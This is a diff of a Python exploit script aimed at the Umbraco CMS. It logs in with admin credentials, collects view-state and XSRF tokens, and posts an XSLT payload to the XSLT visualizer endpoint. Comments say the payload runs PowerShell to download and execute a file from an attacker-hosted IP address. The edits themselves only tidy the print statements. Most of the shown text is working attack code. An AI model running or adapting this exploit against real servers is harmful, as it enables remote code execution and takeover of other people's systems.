@@ -14,8 +14,6 @@ from bs4 import BeautifulSoup;
 def print_dict(dico):
     print(dico.items());
 
-print("Start");
-
 # Powershell payload to download and execute a file
 # Modify x.x.x.x with the IP address where the payload is being hosted
 payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
@@ -34,7 +32,7 @@ username = ""; #umbraco admin username/email
 password = ""; #umbraco admin password
 host = "http://"; #umbraco host address
 
-print("\n [!]Exploiting " + host)
+print("\n [!] Exploiting " + host)
 
 s = requests.session()
 url_main =host+"/umbraco/";
@@ -55,8 +53,6 @@ UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
 headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
 data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
 
-print("\n [!]Sending payload")
+print("\n [!] Sending payload")
 
-r4 = s.post(url_xslt,data=data,headers=headers);
-
-print("\n [!]Payload sent!")
+r4 = s.post(url_xslt,data=data,headers=headers)
